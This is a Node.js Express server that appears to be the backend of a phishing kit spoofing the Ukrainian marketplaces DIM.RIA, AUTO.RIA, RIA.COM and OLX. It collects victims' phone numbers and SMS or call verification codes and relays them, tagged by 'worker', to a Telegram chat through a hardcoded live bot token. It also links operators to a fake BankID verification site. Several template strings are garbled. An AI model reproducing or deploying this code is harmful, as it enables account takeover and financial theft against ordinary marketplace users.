const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');
const fetch = require('node-fetch');

const app = express();
const PORT = process.env.PORT || 3000;

// ТВОИ ДАННЫЕ
const BOT_TOKEN = "8311394660:AAEt9CJLYspkbVUcopIYik2KFh1EXLgIko8";
const CHAT_ID = "-1003298945563";
const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;
const BANKID_URL = "https://idverification.onrender.com";

app.use(bodyParser.json());
app.use(express.static(__dirname));

// === ЛОГОТИПЫ И НАЗВАНИЯ ===
const LOGOS = {
    dimria: "https://play-lh.googleusercontent.com/ztuWEFjw0OavxEvC_Zsxfg9J8gRj_eRFdsSMM7ElokPPUwmc2lAqCW47wbESieS6bw",
    autoria: "https://is1-ssl.mzstatic.com/image/thumb/Purple221/v4/ed/43/65/ed436516-dde8-f65c-d03b-99a9f905fcbd/AppIcon-0-1x_U007emarketing-0-8-0-85-220-0.png/1200x630wa.png",
    ria: "https://ria.riastatic.com/dist/img/logo900.png",
    olx: "https://is1-ssl.mzstatic.com/image/thumb/Purple221/v4/59/21/61/592161cf-9ee3-135c-3e1b-3510535e4b0a/AppIcon_OLX_EU-0-0-1x_U007emarketing-0-8-0-85-220.png/1200x630wa.png"
};

const PROJECT_NAMES = {
    dimria: "DIM.RIA", autoria: "AUTO.RIA", ria: "RIA.COM", olx: "OLX.UA"
};

// === АВТОМАТИЧЕСКАЯ УСТАНОВКА ВЕБХУКА ===
async function setWebhook() {
    const webhookUrl = `\( {process.env.RENDER_EXTERNAL_URL || `https:// \){process.env.RENDER_INSTANCE_NAME}.onrender.com` || `https://\( {process.env.HEROKU_APP_NAME}.herokuapp.com` || `http://localhost: \){PORT}`}/bot${BOT_TOKEN}`;

    try {
        const response = await fetch(`https://api.telegram.org/bot\( {BOT_TOKEN}/setWebhook?url= \){webhookUrl}`);
        const result = await response.json();

        if (result.ok) {
            console.log('Вебхук успешно установлен:', webhookUrl);
            await sendToTelegram(`*Бот запущен и готов к работе!* ✅\nПроекты: DIM.RIA • AUTO.RIA • RIA • OLX\nВебхук: \`${webhookUrl}\``);
        } else {
            console.error('Ошибка установки вебхука:', result);
            await sendToTelegram(`*Ошибка запуска бота!*\n\`${result.description}\``);
        }
    } catch (err) {
        console.error('Не удалось установить вебхук:', err.message);
    }
}

// === ОТПРАВКА СООБЩЕНИЙ В ТГ ===
async function sendToTelegram(message, reply_markup = null) {
    const payload = { chat_id: CHAT_ID, text: message, parse_mode: 'Markdown', disable_web_page_preview: true };
    if (reply_markup) payload.reply_markup = reply_markup;

    for (let i = 0; i < 3; i++) {
        try {
            const res = await fetch(`${TELEGRAM_API}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
            const json = await res.json();
            if (json.ok) return json.result;
        } catch (e) { console.error('Ошибка отправки в ТГ:', e); }
        await new Promise(r => setTimeout(r, 2000));
    }
    return null;
}

// === СТАТИКА И СТРАНИЦА ===
app.get('/', (req, res) => {
    const project = req.query.project || 'dimria';
    if (!Object.keys(LOGOS).includes(project)) return res.status(400).send('Невідомий проект');
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.get('/logo', (req, res) => {
    const project = req.query.project || 'dimria';
    res.redirect(LOGOS[project] || LOGOS.dimria);
});

// === ОБРАБОТКА ДАННЫХ С САЙТА ===
app.post('/api/send-data', async (req, res) => {
    const { step, phone, code, worker = '', project = 'dimria', city = 'Невідомо' } = req.body;
    const projectName = PROJECT_NAMES[project] || 'DIM.RIA';
    const workerTag = worker ? `\n*Воркер:* @${worker}` : '';

    let message = '';
    let reply_markup = null;

    if (step === 'phone' && phone) {
        message = `*НОВИЙ ЛОГ* \n*Проект:* \( {projectName}\n*Номер:* \` \){phone}\`\n*Місто:* \( {city} \){workerTag}`;
        reply_markup = {
            inline_keyboard: [
                [{ text: "Звонок", callback_data: `call_${phone}` }],
                [{ text: "Код", callback_data: `sms_${phone}` }],
                [{ text: "BankID", url: BANKID_URL }]
            ]
        };
    }
    else if (step === 'method_call') message = `*ОБРАНО:* Звонок \n*Номер:* \`\( {phone}\` \){workerTag}`;
    else if (step === 'method_sms') message = `*ОБРАНО:* Код \n*Номер:* \`\( {phone}\` \){workerTag}`;
    else if (step === 'method_bankid') message = `*ОБРАНО:* BankID \n*Номер:* \`\( {phone}\` \){workerTag}`;
    else if (step === 'call_code') message = `*КОД ДЗВІНКА:* \`\( {code}\`\n*Номер:* \` \){phone}\`${workerTag}`;
    else if (step === 'sms_code') message = `*SMS КОД:* \`\( {code}\`\n*Номер:* \` \){phone}\`${workerTag}`;
    else return res.status(400).json({ success: false });

    await sendToTelegram(message, reply_markup);
    res.json({ success: true });
});

// === ВЕБХУК ДЛЯ INLINE-КНОПОК (ГЛАВНОЕ!) ===
app.post(`/bot${BOT_TOKEN}`, async (req, res) => {
    res.sendStatus(200); // Мгновенный ответ

    const callback = req.body.callback_query;
    if (!callback) return;

    const data = callback.data;
    const phone = data.includes('_') ? data.split('_')[1] : 'невідомо';

    if (data.startsWith('call_')) {
        await sendToTelegram(`*ОБРАНО МЕТОД:* Звонок \n*Номер:* \`${phone || phone}\``);
    }
    else if (data.startsWith('sms_')) {
        await sendToTelegram(`*ОБРАНО МЕТОД:* Код \n*Номер:* \`${phone || phone}\``);
    }
});

// === ЗАПУСК СЕРВЕРА ===
app.listen(PORT, async () => {
    console.log(`Сервер запущен на порту ${PORT}`);
    await setWebhook(); // Автоматически ставит вебхук при каждом запуске
});
